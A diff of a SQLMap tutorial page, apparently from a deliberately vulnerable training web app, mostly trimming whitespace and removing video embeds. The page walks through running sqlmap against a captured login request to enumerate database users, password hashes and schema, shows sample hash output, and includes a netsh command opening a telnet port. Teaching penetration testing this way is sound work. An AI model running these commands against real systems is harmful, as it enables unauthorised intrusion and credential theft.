@@ -5,15 +5,15 @@
 			to the tool SQLMap which can be helpful to evaluate the risk exposed by SQL injection
 			vulnerabilities.
 			<br/><br/>
-			SQLMap is an open source penetration testing tool that automates the 
-			process of detecting and exploiting SQL injection flaws. It is 
-			widely considered the best open-source SQL injection testing tool 
+			SQLMap is an open source penetration testing tool that automates the
+			process of detecting and exploiting SQL injection flaws. It is
+			widely considered the best open-source SQL injection testing tool
 			available.
 <br/><br/>
 <a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
 			<br/><br/>
 			<span class="report-header">Running SQLMAP Help</span>
-			<br/><br/>	
+			<br/><br/>
 			Note: On Kali Linux, SQLMap is found in /usr/share/sqlmap/
 			<br/><br/>
 			sqlmap --help	Help<br/>
@@ -28,7 +28,7 @@
 			<span class="report-header">Capturing Request To Pass To SQLMAP</span>
 			<br/><br/>
 			Create a valid HTTP request on the target page. Do not inject malicious input into this request.
-			For example, using Burp-Suite Capture the request in Burp-Proxy --> Intercept 
+			For example, using Burp-Suite Capture the request in Burp-Proxy --> Intercept
 			or lookup request in Burp-Proxy --> HTTP History.
 			<br/><br/>
 			Copy the HTTP request and save to a text file. gedit is a reasonable editor.
@@ -58,13 +58,13 @@ username=asdf&amp;password=asdf&amp;login-php-submit-button=Login
 			Running SQLMAP with &quot;auto-parse&quot;
 			</span>
 			<br/><br/>
-			Start sqlmap telling sqlmap path to file containing HTTP request. 
+			Start sqlmap telling sqlmap path to file containing HTTP request.
 			Attempting to enumerate database server information is a good start (--banner).
-			SQLMap will parse URL and input parameters then attempt to determine database brand and injection points.						
+			SQLMap will parse URL and input parameters then attempt to determine database brand and injection points.
 			<br/><br/>
 				sqlmap -r ~/engagements/sqlmap/login.php.request &lt;options&gt;
 			<br/><br/>
-			sqlmap may find SQL injection automatically. 
+			sqlmap may find SQL injection automatically.
 			But performing recon and initial testing on application can greatly enhance chance of success.
 			Fingerprint database and inform SQLMap with --dbms parameter.
 			Determine likely parameter and tell SQLMap with -p parameter.
@@ -83,7 +83,7 @@ username=asdf&amp;password=asdf&amp;login-php-submit-button=Login
 			<br/><br/>
 			Columns in tables
 			<br/><br/>
-			--columns			
+			--columns
 			<br/><br/>
 			Feed each piece of information discovered into next round of testing
 			<br/><br/>
@@ -123,7 +123,7 @@ username=asdf&amp;password=asdf&amp;login-php-submit-button=Login
     --users             Enumerate DBMS users
     --passwords         Enumerate DBMS users password hashes
 
-	database management system users 
+	database management system users
 	[*] &#39;&#39;@&#39;localhost&#39;
 	[*] &#39;pma&#39;@&#39;localhost&#39;
 	[*] &#39;root&#39;@&#39;linux&#39;
@@ -185,7 +185,7 @@ Enumerate DBMS database tables, columns, structure (schema)
 <span style="white-space: pre;">
 	sqlmap -r ~/engagements/sqlmap/login.php.request -D mysql -T user --columns
 	sqlmap -r ~/engagements/sqlmap/login.php.request -D mysql -T user --common-columns
-	sqlmap -r ~/engagements/sqlmap/login.php.request -D mysql 
+	sqlmap -r ~/engagements/sqlmap/login.php.request -D mysql
 	--sql-query=&quot;select column_name from information_schema.columns where table_name = &#39;user&#39;&quot;
 
 	select column_name from information_schema.columns where table_name = &#39;user&#39; [42]:
@@ -260,15 +260,15 @@ Advanced: Dealing with inconsistent results
 	select User, Password from mysql.user order by User desc
 
 	select User, Password, Host, authentication_string from mysql.user order by User desc [9]:
-		[*] root, , localhost, 
-		[*] root, , linux, 
-		[*] pma, , localhost, 
-		[*] Simba, *F43B942A34347297C3B0455DAB190AFB9BBF13B5, localhost, 
-		[*] Rocky, *2BA8DF85753BE61F6C72A8784B11E68A41878032, localhost, 
-		[*] Patches, *2027D9391E714343187E07ACB41AE8925F30737E, localhost, 
-		[*] Happy, *160E7D8EE3A97BED0F0AD1563BFB619178D15D7B, localhost, 
-		[*] , , localhost, 
-		[*] , , linux, 
+		[*] root, , localhost,
+		[*] root, , linux,
+		[*] pma, , localhost,
+		[*] Simba, *F43B942A34347297C3B0455DAB190AFB9BBF13B5, localhost,
+		[*] Rocky, *2BA8DF85753BE61F6C72A8784B11E68A41878032, localhost,
+		[*] Patches, *2027D9391E714343187E07ACB41AE8925F30737E, localhost,
+		[*] Happy, *160E7D8EE3A97BED0F0AD1563BFB619178D15D7B, localhost,
+		[*] , , localhost,
+		[*] , , linux,
 </span>
 						<br/><br/>
 						<span class="report-header">
@@ -332,13 +332,4 @@ netsh firewall add portopening protocol=TCP port=23 name=telnet mode=enable scop
 <br/><br/>
 <span id="videos" class="report-header">Videos</span>
 <br/><br/>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->AutomateSQLInjectionusingsqlmap);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->BasicsofSQLInjectionTimingAttacks);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontoUnionBasedSQLInjection);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->BasicsofInsertingDatawithSQLInjection);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->InjectWebShellBackdoorviaSQLInjection);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->BasicsofusingSQLInjectiontoReadFiles);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->BasicsofusingsqlmapISSAKYWorkshopFebruary2013);	?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontoSQLInjectionforBeginners);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontoSQLInjectionwithSQLMap);?>
 <br/><br/>
